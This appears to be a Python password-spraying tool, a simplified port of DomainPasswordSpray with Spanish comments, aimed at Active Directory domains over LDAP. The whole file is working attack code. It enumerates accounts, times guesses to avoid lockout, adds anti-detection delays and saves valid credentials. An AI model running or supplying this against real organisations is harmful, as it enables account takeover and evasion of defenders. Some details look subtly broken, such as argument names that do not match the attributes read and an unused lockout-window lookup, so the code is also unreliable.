#!/usr/bin/env python3
"""
DomainPasswordSpray.py - Python port of dafthack/DomainPasswordSpray (versión simplificada)
python3 DomainPasswordSpray.py -Domain empresa.com -Password Winter2026
"""

import argparse
import sys
import time
import random
from ldap3 import Server, Connection, ALL
import getpass

class DomainPasswordSpray:
    def __init__(self, args):
        self.args = args
        self.dc_ip = None
        self.domain = args.domain
        self.ldap_user = None
        self.ldap_pass = None
        self.observation_window = 30
        self.lockout_threshold = 5
        
    def countdown_timer(self, seconds, message="[*] Pausing to avoid account lockout."):
        """Cuenta regresiva entre rondas de passwords"""
        for i in range(seconds, 0, -1):
            mins = i // 60
            secs = i % 60
            print(f"\r{message} Waiting {mins:02d}:{secs:02d}", end='', flush=True)
            time.sleep(1)
        print("\r" + " " * 80 + "\r", end='', flush=True)

    def get_observation_window(self, dc_ip):
        """Obtiene la ventana de observación del dominio"""
        server = Server(dc_ip, get_info=ALL)
        conn = Connection(server, user=f"{self.ldap_user}@{self.domain}", 
                         password=self.ldap_pass, auto_bind=True)
        
        base_dn = f"DC={self.domain.replace('.', ',DC=')}"
        conn.search(base_dn, '(objectClass=*)', attributes=['lockOutObservationWindow'])
        
        if conn.entries:
            window = abs(int(conn.entries[0].lockOutObservationWindow.value or 0)) / 600000000
            return int(window)
        return 30

    def get_domain_users(self, dc_ip, filter_str=""):
        """Genera lista segura de usuarios del dominio"""
        server = Server(dc_ip, get_info=ALL)
        conn = Connection(server, user=f"{self.ldap_user}@{self.domain}", 
                         password=self.ldap_pass, auto_bind=True)
        
        base_dn = f"DC={self.domain.replace('.', ',DC=')}"
        
        # Filtro: usuarios activos, no cerca de lockout
        base_filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
        if filter_str:
            base_filter += f"({filter_str})"
        
        users = []
        conn.search(base_dn, base_filter, attributes=['sAMAccountName', 'badPwdCount'], 
                   paged_size=1000, size_limit=0)
        
        print(f"[*] {len(conn.entries)} total users found")
        print("[*] Removing users within 1 attempt of locking out...")
        
        for entry in conn.entries:
            bad_count = int(entry.badPwdCount.value or 0)
            if (self.lockout_threshold - bad_count) > 1:  # Más de 1 intento restante
                users.append(str(entry.sAMAccountName.value))
        
        print(f"[*] Created userlist with {len(users)} safe users")
        return users

    def spray_single_password(self, dc_ip, users, password, outfile=None, username_as_password=False):
        """Prueba una contraseña contra todos los usuarios"""
        count = len(users)
        successes = []
        
        print(f"[*] Trying password '{password}' against {count} users")
        
        for i, username in enumerate(users):
            if username_as_password:
                test_pass = username
            else:
                test_pass = password
            
            # LDAP bind test
            server = Server(dc_ip, connect_timeout=5, receive_timeout=10)
            conn = Connection(server, user=f"{username}@{self.domain}", 
                            password=test_pass, raise_exceptions=False)
            
            if conn.bind():
                success = f"{username}:{test_pass}"
                successes.append(success)
                print(f"\033[92m[*] SUCCESS! {success}\033[0m")
                if outfile:
                    with open(outfile, 'a') as f:
                        f.write(f"{success}\n")
            
            conn.unbind()
            print(f"{i+1} of {count} users tested", end='\r', flush=True)
            time.sleep(random.uniform(0.8, 1.5))  # Delay anti-detección
        
        return successes

    def confirm_spray(self, user_count):
        """Confirmación antes de spray"""
        print(f"\n[*] Confirm Password Spray")
        print(f"Are you sure you want to spray {user_count} accounts? [y/N]")
        response = input().lower()
        return response in ['y', 'yes']

    def run(self):
        # Pedir credenciales LDAP interactivamente
        print("[*] LDAP credentials required for enumeration")
        self.ldap_user = input("LDAP Username (user@domain.com): ")
        self.ldap_pass = getpass.getpass("LDAP Password: ")
        
        # Auto-detectar DC
        print("[*] Detecting Domain Controller...")
        try:
            server = Server(self.domain, get_info=ALL, locate_flavor='SRV')
            self.dc_ip = server.host[0].addr if server.host else None
        except:
            self.dc_ip = input("DC IP (ej: 192.168.1.10): ")
        
        print(f"[*] Using DC: {self.dc_ip}")
        
        # Obtener passwords
        if self.args.password:
            passwords = [self.args.password]
        elif self.args.password_list:
            with open(self.args.password_list) as f:
                passwords = [line.strip() for line in f if line.strip()]
        elif self.args.username_as_password:
            passwords = None
        else:
            print("[-] ERROR: Specify -Password, -PasswordList, or -UsernameAsPassword")
            return
        
        # Obtener usuarios
        if self.args.user_list:
            print(f"[*] Using {self.args.user_list} as userlist")
            print("[!] Warning: Userlist bypasses lockout checks!")
            with open(self.args.user_list) as f:
                users = [line.strip() for line in f if line.strip()]
        else:
            print("[*] Auto-generating safe userlist...")
            users = self.get_domain_users(self.dc_ip, self.args.filter)
        
        if not self.confirm_spray(len(users)):
            print("[-] Cancelled")
            return
        
        print(f"[*] Password spraying with {len(passwords) if passwords else 'username-as-password'} passwords")
        print(f"[*] Domain observation window: {self.observation_window} minutes")
        
        all_successes = []
        
        # Spray cada password
        if self.args.username_as_password:
            successes = self.spray_single_password(self.dc_ip, users, None, self.args.outfile, True)
            all_successes.extend(successes)
        else:
            for i, password in enumerate(passwords):
                print(f"\n[*] Password {i+1}/{len(passwords)}")
                successes = self.spray_single_password(self.dc_ip, users, password, self.args.outfile)
                all_successes.extend(successes)
                
                if i+1 < len(passwords):
                    wait_seconds = self.observation_window * 60 + 600  # +10min fudge
                    self.countdown_timer(wait_seconds)
        
        print("\n[*] Password spraying complete!")
        if self.args.outfile:
            print(f"[*] Successes saved to {self.args.outfile}")
        
        if all_successes:
            print(f"[+] Found {len(all_successes)} valid credentials")

def main():
    parser = argparse.ArgumentParser(description="DomainPasswordSpray.py - Simplified")
    parser.add_argument('-UserList', help='Userlist file')
    parser.add_argument('-Password', help='Single password')
    parser.add_argument('-PasswordList', help='Password list file')
    parser.add_argument('-OutFile', '-o', help='Output file')
    parser.add_argument('-Domain', '-d', required=True, help='Domain name')
    parser.add_argument('-Filter', help='LDAP filter e.g. "(description=*admin*)"')
    parser.add_argument('-UsernameAsPassword', action='store_true', help='Username as password')
    
    args = parser.parse_args()
    
    sprayer = DomainPasswordSpray(args)
    sprayer.run()

if __name__ == "__main__":
    main()